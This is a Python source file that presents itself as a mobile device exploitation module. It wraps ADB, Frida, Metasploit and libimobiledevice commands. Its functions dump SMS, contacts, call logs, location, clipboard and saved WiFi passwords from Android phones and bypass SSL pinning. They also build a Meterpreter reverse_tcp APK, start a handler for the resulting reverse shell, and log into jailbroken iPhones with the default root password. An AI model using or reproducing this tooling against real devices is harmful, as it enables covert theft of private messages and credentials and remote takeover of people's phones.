"""
Mobile device exploitation module for T.
Android: ADB (USB + network), APK analysis, Frida runtime hooks, payload delivery.
iOS: libimobiledevice backup extraction, jailbroken SSH access.
All VM commands route through vm_bridge; ADB USB commands run locally via subprocess.
"""

import asyncio
import re
from typing import AsyncIterator
from offensive.vm_bridge import vm
from offensive.stream import stream_subprocess
from core.logger import get_logger

log = get_logger("devices.mobile")


# ─── Android — Local ADB (USB) ────────────────────────────────────────────────

async def adb_devices() -> list[dict]:
    """List connected Android devices via local ADB."""
    lines: list[str] = []
    async for line in stream_subprocess(["adb", "devices", "-l"], timeout=10):
        lines.append(line)

    devices = []
    for line in lines[1:]:  # skip header
        line = line.strip()
        if not line or "offline" in line:
            continue
        parts = line.split()
        if len(parts) >= 2 and parts[1] in ("device", "unauthorized"):
            info = " ".join(parts[2:]) if len(parts) > 2 else ""
            devices.append({
                "serial": parts[0],
                "state":  parts[1],
                "info":   info,
            })
    return devices


async def adb_shell(serial: str, command: str) -> AsyncIterator[str]:
    """Run a shell command on a connected Android device."""
    async for line in stream_subprocess(
        ["adb", "-s", serial, "shell", command], timeout=30
    ):
        yield line


async def adb_fingerprint(serial: str) -> AsyncIterator[str]:
    """Get device make, model, Android version, build."""
    props = [
        ("Make",           "ro.product.manufacturer"),
        ("Model",          "ro.product.model"),
        ("Android",        "ro.build.version.release"),
        ("SDK",            "ro.build.version.sdk"),
        ("Build",          "ro.build.id"),
        ("Security patch", "ro.build.version.security_patch"),
        ("ABI",            "ro.product.cpu.abi"),
        ("USB debug",      "persist.adb.tcp.port"),
    ]
    for label, prop in props:
        val = ""
        async for line in stream_subprocess(
            ["adb", "-s", serial, "shell", f"getprop {prop}"], timeout=8
        ):
            val = line.strip()
        yield f"{label}: {val}"


async def adb_pull_apk(serial: str, package: str, dest: str = "/tmp") -> AsyncIterator[str]:
    """Extract an installed APK from the device."""
    # Get APK path
    path = ""
    async for line in stream_subprocess(
        ["adb", "-s", serial, "shell", f"pm path {package}"], timeout=10
    ):
        if line.startswith("package:"):
            path = line.replace("package:", "").strip()

    if not path:
        yield f"[ERROR] Package '{package}' not found on device"
        return

    yield f"APK path: {path}"
    async for line in stream_subprocess(
        ["adb", "-s", serial, "pull", path, dest], timeout=30
    ):
        yield line


async def adb_install(serial: str, apk_path: str) -> AsyncIterator[str]:
    """Install an APK on the device."""
    async for line in stream_subprocess(
        ["adb", "-s", serial, "install", "-r", apk_path], timeout=60
    ):
        yield line


async def adb_list_packages(serial: str, third_party_only: bool = True) -> AsyncIterator[str]:
    """List installed packages."""
    flag = "-3" if third_party_only else ""
    async for line in stream_subprocess(
        ["adb", "-s", serial, "shell", f"pm list packages {flag}"], timeout=15
    ):
        yield line.replace("package:", "").strip()


async def adb_screenshot(serial: str, dest: str = "screen.png") -> AsyncIterator[str]:
    """Capture device screenshot."""
    async for line in stream_subprocess(
        ["adb", "-s", serial, "exec-out", "screencap", "-p"], timeout=10
    ):
        yield line
    yield f"[T] Screenshot saved to {dest}"


async def adb_sms_dump(serial: str) -> AsyncIterator[str]:
    """Dump SMS messages."""
    cmd = (
        "content query --uri content://sms "
        "--projection _id,address,date,body,type"
    )
    async for line in adb_shell(serial, cmd):
        yield line


async def adb_contacts_dump(serial: str) -> AsyncIterator[str]:
    """Dump contacts."""
    cmd = (
        "content query --uri content://contacts/phones "
        "--projection display_name,number"
    )
    async for line in adb_shell(serial, cmd):
        yield line


async def adb_call_log(serial: str) -> AsyncIterator[str]:
    """Dump call log."""
    cmd = (
        "content query --uri content://call_log/calls "
        "--projection number,date,duration,type"
    )
    async for line in adb_shell(serial, cmd):
        yield line


async def adb_location(serial: str) -> AsyncIterator[str]:
    """Attempt to read last known location."""
    async for line in adb_shell(serial, "dumpsys location | grep 'Last Known'"):
        yield line


async def adb_wifi_passwords(serial: str) -> AsyncIterator[str]:
    """Dump saved WiFi passwords (requires root)."""
    async for line in adb_shell(serial, "cat /data/misc/wifi/wpa_supplicant.conf"):
        yield line


async def adb_clipboard(serial: str) -> AsyncIterator[str]:
    """Read clipboard content."""
    async for line in adb_shell(serial, "service call clipboard 2 s16 com.android.shell"):
        yield line


async def adb_backup(serial: str, package: str, dest: str = "/tmp/backup.ab") -> AsyncIterator[str]:
    """Pull app data backup."""
    async for line in stream_subprocess(
        ["adb", "-s", serial, "backup", "-f", dest, "-noapk", package], timeout=60
    ):
        yield line


# ─── Android — Network ADB ────────────────────────────────────────────────────

async def adb_connect_network(ip: str, port: int = 5555) -> AsyncIterator[str]:
    """Connect to ADB over network (device must have TCP ADB enabled)."""
    async for line in stream_subprocess(
        ["adb", "connect", f"{ip}:{port}"], timeout=15
    ):
        yield line


async def adb_enable_tcp(serial: str, port: int = 5555) -> AsyncIterator[str]:
    """Enable ADB over TCP on a USB-connected device."""
    async for line in stream_subprocess(
        ["adb", "-s", serial, "tcpip", str(port)], timeout=10
    ):
        yield line
    yield f"[T] ADB TCP enabled on port {port}. Now connect over WiFi."


# ─── Android — APK Analysis (VM) ─────────────────────────────────────────────

async def apk_decompile(apk_path: str, out_dir: str = "/tmp/apk_out") -> AsyncIterator[str]:
    """Decompile APK with apktool on the VM."""
    cmd = f"apktool d -f '{apk_path}' -o {out_dir} 2>&1"
    async for line in vm.run(cmd, timeout=120):
        yield line


async def apk_find_secrets(apk_path: str) -> AsyncIterator[str]:
    """
    Decompile APK and grep for hardcoded secrets:
    API keys, URLs, passwords, tokens.
    """
    out_dir = "/tmp/apk_secrets_scan"
    patterns = [
        r"api[_-]?key",
        r"secret[_-]?key",
        r"password",
        r"passwd",
        r"token",
        r"auth",
        r"Bearer ",
        r"jdbc:",
        r"mongodb://",
        r"http[s]?://[^\"']{10,}",
    ]
    grep_pattern = "|".join(patterns)
    cmd = (
        f"apktool d -f '{apk_path}' -o {out_dir} -q 2>/dev/null && "
        f"grep -rEi '{grep_pattern}' {out_dir}/smali {out_dir}/res "
        f"--include='*.smali' --include='*.xml' --include='*.json' "
        f"--include='*.properties' -l 2>/dev/null | head -50"
    )
    async for line in vm.run(cmd, timeout=180):
        yield line


async def apk_permissions(apk_path: str) -> AsyncIterator[str]:
    """Extract permissions declared in AndroidManifest.xml."""
    cmd = f"apktool d -f '{apk_path}' -o /tmp/apk_perms -q && grep -i 'uses-permission' /tmp/apk_perms/AndroidManifest.xml"
    async for line in vm.run(cmd, timeout=60):
        yield line


# ─── Android — Frida (VM → device) ───────────────────────────────────────────

async def frida_list_apps(device_ip: str) -> AsyncIterator[str]:
    """List running apps on device via Frida over USB or network."""
    cmd = f"frida-ps -H {device_ip} 2>/dev/null || frida-ps -U 2>/dev/null"
    async for line in vm.run(cmd, timeout=20):
        yield line


async def frida_ssl_bypass(device_ip: str, package: str) -> AsyncIterator[str]:
    """Bypass SSL certificate pinning in an Android app using objection."""
    cmd = (
        f"objection -N -h {device_ip} -g {package} "
        f"explore --startup-command 'android sslpinning disable'"
    )
    async for line in vm.run(cmd, timeout=60):
        yield line


async def frida_hook_custom(device_ip: str, package: str, script_path: str) -> AsyncIterator[str]:
    """Run a custom Frida script against an app."""
    cmd = f"frida -H {device_ip} -n '{package}' -l '{script_path}' --no-pause"
    async for line in vm.run(cmd, timeout=120):
        yield line


# ─── Android — Payload delivery ───────────────────────────────────────────────

async def gen_android_payload(lhost: str, lport: str, output: str = "/tmp/msf.apk") -> AsyncIterator[str]:
    """Generate Android Meterpreter APK via msfvenom."""
    cmd = (
        f"msfvenom -p android/meterpreter/reverse_tcp "
        f"LHOST={lhost} LPORT={lport} -o {output}"
    )
    async for line in vm.run(cmd, timeout=60):
        yield line


async def start_android_listener(lhost: str, lport: str) -> AsyncIterator[str]:
    """Start Metasploit handler for Android reverse shell."""
    cmd = (
        f"msfconsole -q -x '"
        f"use exploit/multi/handler; "
        f"set payload android/meterpreter/reverse_tcp; "
        f"set LHOST {lhost}; set LPORT {lport}; "
        f"run'"
    )
    async for line in vm.run(cmd, timeout=600):
        yield line


# ─── iOS ─────────────────────────────────────────────────────────────────────

async def ios_discover(subnet: str) -> AsyncIterator[str]:
    """Find iOS devices on the network via nmap."""
    cmd = (
        f"nmap -sV -p 62078,22,80,443,8080 "
        f"--script 'http-apple-app-site-association' "
        f"{subnet}"
    )
    async for line in vm.run(cmd, timeout=120):
        yield line


async def ios_backup(device_ip: str, output: str = "/tmp/ios_backup") -> AsyncIterator[str]:
    """Extract iOS backup via libimobiledevice (USB connected to VM or locally)."""
    cmd = f"idevicebackup2 backup --full {output} 2>&1"
    async for line in vm.run(cmd, timeout=300):
        yield line


async def ios_info() -> AsyncIterator[str]:
    """Get connected iOS device info via libimobiledevice (USB)."""
    async for line in stream_subprocess(["ideviceinfo"], timeout=10):
        yield line


async def ios_ssh_connect(device_ip: str) -> AsyncIterator[str]:
    """SSH into a jailbroken iOS device (default root:alpine)."""
    cmd = f"sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@{device_ip} 'uname -a && id'"
    async for line in vm.run(cmd, timeout=15):
        yield line


async def ios_dump_ipa(device_ip: str, bundle_id: str) -> AsyncIterator[str]:
    """Dump a decrypted IPA from a jailbroken device using frida-ios-dump."""
    cmd = f"python3 /opt/frida-ios-dump/dump.py -H {device_ip} -p 22 -u root -P alpine '{bundle_id}'"
    async for line in vm.run(cmd, timeout=120):
        yield line
